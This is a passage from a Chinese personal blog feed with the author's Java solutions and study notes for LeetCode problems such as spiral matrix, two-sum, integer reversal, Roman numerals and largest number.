src="leetcode2.assets/image-20210506163449701.png"></p><p>经典题目，学C语言的时候看过没写过，写关于矩阵的东西需要找到矩阵变化规律。</p><p>网上找的图，就是把四条边动态化（反正这个思路我是想不出来）。矩阵的上下两条边对应，左右两条边对应，一边在加则另一边减，直到两条边重合。</p><p><img src="leetcode2.assets/bVbCfPh.webp"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">思路:</span><br><span class="line">定义矩阵的四条边</span><br><span class="line">每当遍历完一层这条边就减1</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">spiralOrder</span><span class="params">(<span class="keyword">int</span>[][] matrix)</span> </span>&#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            * 定义四个边界</span></span><br><span class="line"><span class="comment">            * 两两对应</span></span><br><span class="line"><span class="comment">            * 一边加就一边减*/</span></span><br><span class="line">            <span class="keyword">int</span> up = <span class="number">0</span>,down = matrix.length - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> left = <span class="number">0</span>,right = matrix[<span class="number">0</span>].length - <span class="number">1</span>;</span><br><span class="line">            List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = left; i &lt;= right; i++) &#123;</span><br><span class="line">                    list.add(matrix[up][i]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (++up&gt;down)<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = up; i &lt;= down; i++) &#123;</span><br><span class="line">                    list.add(matrix[i][right]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (--right &lt; left)<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = right; i &gt;= left ; i--) &#123;</span><br><span class="line">                    list.add(matrix[down][i]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (--down &lt; up)<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = down; i &gt;= up ; i--) &#123;</span><br><span class="line">                    list.add(matrix[i][left]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (++left &gt; right)<span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> list;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="螺旋矩阵Ⅱ"><a href="#螺旋矩阵Ⅱ" class="headerlink" title="螺旋矩阵Ⅱ"></a>螺旋矩阵Ⅱ</h2><p><img src="leetcode2.assets/image-20210508003913353.png"></p><p>和螺旋矩阵Ⅰ的思路是一样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">int</span>[][] generateMatrix(<span class="keyword">int</span> n) &#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>,right = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> up = <span class="number">0</span>, down = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span>[][] matrix = <span class="keyword">new</span> <span class="keyword">int</span>[n][n];</span><br><span class="line">        <span class="keyword">int</span> num=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = up; i &lt;= right; i++) &#123;</span><br><span class="line">                matrix[up][i] = num++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (++up&gt;down)<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = up; i &lt;= down ; i++) &#123;</span><br><span class="line">                matrix[i][right] = num++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (--right &lt; left)<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = right; i &gt;= left ; i--) &#123;</span><br><span class="line">                matrix[down][i] = num++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (--down &lt; up)<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = down; i &gt;= up ; i--) &#123;</span><br><span class="line">                matrix[i][left] = num++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (++left&gt;right)<span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> matrix;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="螺旋矩阵Ⅲ"><a href="#螺旋矩阵Ⅲ" class="headerlink" title="螺旋矩阵Ⅲ"></a>螺旋矩阵Ⅲ</h2><p><img src="leetcode2.assets/image-20210508004424560.png"></p><p><img src="leetcode2.assets/image-20210508004450737.png"></p><p>两种思路：</p><ul><li>和上面的思路一样，动态模拟四条边</li><li>找规律，通过观察可知，每次右移和下移走的步数是奇数，左移和上移走的步数是偶数，所以可以以起始点为中心（上图其实都表示出来了），定义一个正方形，遍历这个正方形的所有坐标，如果坐标范围在矩形内，则符合条件</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">checkPost</span><span class="params">(<span class="keyword">int</span> R,<span class="keyword">int</span> C,<span class="keyword">int</span> r0,<span class="keyword">int</span> c0)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (r0&gt;=R || r0&lt;<span class="number">0</span> || c0&gt;=C || c0&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] spiralMatrixIII(<span class="keyword">int</span> R, <span class="keyword">int</span> C, <span class="keyword">int</span> r0, <span class="keyword">int</span> c0) &#123;</span><br><span class="line">        <span class="comment">// 输入参数，矩阵宽高，起始位置</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 将不规则矩阵看成正方形</span></span><br><span class="line"><span class="comment">         * 模拟上下左右边界</span></span><br><span class="line"><span class="comment">         * 单独设置一个技术变量判断是否遍历完成</span></span><br><span class="line"><span class="comment">         * 遍历方向：右，下，左，上*/</span></span><br><span class="line">        <span class="keyword">int</span>[][] arr = <span class="keyword">new</span> <span class="keyword">int</span>[R*C][<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> max = R&gt;=C?R:C;</span><br><span class="line">        arr[num][<span class="number">0</span>] = r0;</span><br><span class="line">        arr[num][<span class="number">1</span>] = c0;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= max*<span class="number">2</span>; i+=<span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">                c0+=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (checkPost(R,C,r0,c0))&#123;</span><br><span class="line">                    ++num;</span><br><span class="line">                    arr[num][<span class="number">0</span>]=r0;</span><br><span class="line">                    arr[num][<span class="number">1</span>]=c0;</span><br><span class="line"><span class="comment">//                    System.out.println(&quot;x,y: &quot;+r0+&quot;,&quot;+c0);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">                r0 += <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (checkPost(R,C,r0,c0))&#123;</span><br><span class="line">                    ++num ;</span><br><span class="line">                    arr[num][<span class="number">0</span>]=r0;</span><br><span class="line">                    arr[num][<span class="number">1</span>]=c0;</span><br><span class="line"><span class="comment">//                    System.out.println(&quot;x,y: &quot;+r0+&quot;,&quot;+c0);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; i+<span class="number">2</span>; j++) &#123;</span><br><span class="line">                c0 -=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (checkPost(R,C,r0,c0))&#123;</span><br><span class="line">                    ++num ;</span><br><span class="line">                    arr[num][<span class="number">0</span>]=r0;</span><br><span class="line">                    arr[num][<span class="number">1</span>]=c0;</span><br><span class="line"><span class="comment">//                    System.out.println(&quot;x,y: &quot;+r0+&quot;,&quot;+c0);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; i+<span class="number">2</span>; j++) &#123;</span><br><span class="line">                r0 -= <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (checkPost(R,C,r0,c0))&#123;</span><br><span class="line">                    ++num ;</span><br><span class="line">                    arr[num][<span class="number">0</span>]=r0;</span><br><span class="line">                    arr[num][<span class="number">1</span>]=c0;</span><br><span class="line"><span class="comment">//                    System.out.println(&quot;x,y: &quot;+r0+&quot;,&quot;+c0);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="leetcode2.assets/image-20210521162901699.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;主要是想练习下递归，学下递归思想，还有dfs。&lt;/p&gt;
&lt;h2 id=&quot;Hanota&quot;&gt;&lt;a href=&quot;#Hanota&quot; class=&quot;headerlink&quot; title=&quot;Hanota&quot;&gt;&lt;/a&gt;Hanota&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;leetcode2.ass</summary>
      
    
    
    
    <category term="LeetCode" scheme="http://example.com/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="http://example.com/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>Leetcode(1)</title>
    <link href="http://example.com/2021/04/13/LeetCode/leetcode1/"/>
    <id>http://example.com/2021/04/13/LeetCode/leetcode1/</id>
    <published>2021-04-12T16:02:15.868Z</published>
    <updated>2021-05-06T08:36:11.282Z</updated>
    
    <content type="html"><![CDATA[<h2 id="towsum"><a href="#towsum" class="headerlink" title="towsum"></a>towsum</h2><p><img src="leetcode1.assets/image-20210426220730463.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">       <span class="keyword">int</span>[] index = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>];</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; nums.length; j++) &#123;</span><br><span class="line">               <span class="keyword">if</span> (nums[i] + nums[j] == target &amp;&amp; i != j) &#123;</span><br><span class="line">                   index[<span class="number">0</span>] = i;</span><br><span class="line">                   index[<span class="number">1</span>] = j;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> index;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ul><li><p>hashMap</p><p>上面的方法在时间复杂堵上为O(n*n)，在数据过大时十分暴力，可以采用哈希表来检索</p></li></ul><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><p><img src="leetcode1.assets/image-20210426220647641.png"></p><p>看到别人的做法才感觉好厉害，思路非常灵活。</p><p><img src="leetcode1.assets/image-20210413000228867.png"></p><p>这种根据原理判断整数是否溢出虽然比较科学，但感觉没有榜一大哥那么有灵性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x != <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">// 先判断倒序数字是否满足条件</span></span><br><span class="line">            <span class="keyword">if</span>(ret&gt;Integer.MAX_VALUE/<span class="number">10</span> || (ret==Integer.MAX_VALUE/<span class="number">10</span> &amp;&amp; x&gt;<span class="number">7</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(ret&lt;Integer.MIN_VALUE/<span class="number">10</span> || (ret==Integer.MIN_VALUE/<span class="number">10</span> &amp;&amp; x&lt;-<span class="number">8</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ret = ret*<span class="number">10</span>+x%<span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="isPalindrome"><a href="#isPalindrome" class="headerlink" title="isPalindrome"></a>isPalindrome</h2><img src="leetcode1.assets/image-20210413003108936.png" style="zoom:80%;" /><p>这道题和上面将数字倒序的思想是一样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">     <span class="comment">// 判断负数</span></span><br><span class="line">     <span class="keyword">if</span>(x&lt;<span class="number">0</span>)&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">     &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">int</span> temp = x, cmpNum=<span class="number">0</span>;</span><br><span class="line">         <span class="keyword">while</span> (temp != <span class="number">0</span>)&#123;</span><br><span class="line">             cmpNum = cmpNum*<span class="number">10</span> + temp%<span class="number">10</span>;</span><br><span class="line">             temp /= <span class="number">10</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">if</span>(cmpNum==x)&#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span>  <span class="keyword">false</span>;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="leetcode1.assets/image-20210413003236573.png"></p><h2 id="romanToInt"><a href="#romanToInt" class="headerlink" title="romanToInt"></a>romanToInt</h2><p><img src="leetcode1.assets/image-20210413214054861.png"></p><p>这道题也可以用打表的思路，将不能单个字符表示的罗马数字全部穷举出来，这里只有6组，然后上哈希表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4, 9, 40, 90, 400, 900</span><br><span class="line">IV IX XL  XC  CD   CM</span><br></pre></td></tr></table></figure><p>从右到左来切割判断</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">romanToInt</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        String[] strArr = &#123;<span class="string">&quot;I&quot;</span>,<span class="string">&quot;IV&quot;</span>,<span class="string">&quot;V&quot;</span>,<span class="string">&quot;IX&quot;</span>,<span class="string">&quot;X&quot;</span>,<span class="string">&quot;XL&quot;</span>,<span class="string">&quot;L&quot;</span>,<span class="string">&quot;XC&quot;</span>,<span class="string">&quot;C&quot;</span>,<span class="string">&quot;CD&quot;</span>,<span class="string">&quot;D&quot;</span>,<span class="string">&quot;CM&quot;</span>,<span class="string">&quot;M&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] num = &#123;<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">40</span>,<span class="number">50</span>,<span class="number">90</span>,<span class="number">100</span>,<span class="number">400</span>,<span class="number">500</span>,<span class="number">900</span>,<span class="number">1000</span>&#125;;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; strArr.length; i++) &#123;</span><br><span class="line">            map.put(strArr[i],num[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length();) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i+<span class="number">2</span>&lt;=s.length() &amp;&amp; (map.containsKey(s.substring(i,i+<span class="number">2</span>))))&#123;</span><br><span class="line">                ret += map.get(s.substring(i,i+<span class="number">2</span>));</span><br><span class="line">                i += <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ret += map.get(s.substring(i,i+<span class="number">1</span>));</span><br><span class="line">            i += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="largestNumber"><a href="#largestNumber" class="headerlink" title="largestNumber"></a>largestNumber</h2><p><img src="leetcode1.assets/image-20210413213455765.png"></p><p>这道题折磨了一天，需要用到别人感觉并不复杂但是我看不懂的数学证明，所以数学证明是不可能证明的，用字符串解决</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">largestNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span></span>&#123;</span><br><span class="line">        <span class="comment">/// 不能用顺序排列</span></span><br><span class="line">    <span class="comment">/// 数字排序和字符串排序思路都不同</span></span><br><span class="line">        <span class="keyword">int</span> n = nums.length;</span><br><span class="line">        String[] numStr = <span class="keyword">new</span> String[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            numStr[i] = String.valueOf(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/// compareTo返回前字符串比较字符ASCII与后字符串比较字母ASCII的差值</span></span><br><span class="line">        Arrays.sort(numStr,(a, b)-&gt;&#123;     <span class="comment">// 使用lambda重写sort函数，使其字符串逆序排序</span></span><br><span class="line">            <span class="keyword">return</span> (b+a).compareTo(a+b); <span class="comment">// 如果后面加起来比前面大的话，返回1</span></span><br><span class="line">                                         <span class="comment">// 否则返回0</span></span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(Arrays.toString(numStr));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(numStr[<span class="number">0</span>].equals(<span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        StringBuilder ret = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numStr.length; i++) &#123;</span><br><span class="line">            ret.append(numStr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="黑白方格画"><a href="#黑白方格画" class="headerlink" title="黑白方格画"></a>黑白方格画</h2><p><img src="leetcode1.assets/image-20210421164744748.png"></p><p>一道纯考排列组合的数学题，两年没有碰过这些考智商的东西，脑袋没转过弯来，虽然里面包含的数学知识也不是很复杂，</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210426222142215.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210426222211918.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">factorial</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(a == <span class="number">1</span> || a == <span class="number">0</span>)</span><br><span class="line">           <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">       <span class="keyword">return</span> factorial(a-<span class="number">1</span>)*a;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">combine</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line">       <span class="keyword">return</span> factorial(n)/(factorial(a)*factorial(n-a));</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">paintingPlan</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (n*n == k)&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span> <span class="keyword">if</span>(n &gt; k)&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> a=<span class="number">0</span>; a&lt;=n; a++)&#123;</span><br><span class="line">           <span class="keyword">for</span>(<span class="keyword">int</span> b=<span class="number">0</span>; b&lt;=n; b++)&#123;</span><br><span class="line">               <span class="keyword">if</span>(k == n*(a+b)-a*b)&#123;</span><br><span class="line">                   ret += combine(n, a)*combine(n, b);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> ret;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="跳水板-amp-amp-青蛙跳台阶"><a href="#跳水板-amp-amp-青蛙跳台阶" class="headerlink" title="跳水板 &amp;&amp; 青蛙跳台阶"></a>跳水板 &amp;&amp; 青蛙跳台阶</h2><p><img src="leetcode1.assets/image-20210421194225407.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210423194542590.png"></p><p>这道题如果用纯递归的方法去做属实不行，时间复杂度太高了<code>&lt;O(2^n)&gt;</code>，斐波那契数列的性质是一样的，前面两个数决定后一个数，动态规划</p><ul><li>递归方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">divingBoard</span><span class="params">(<span 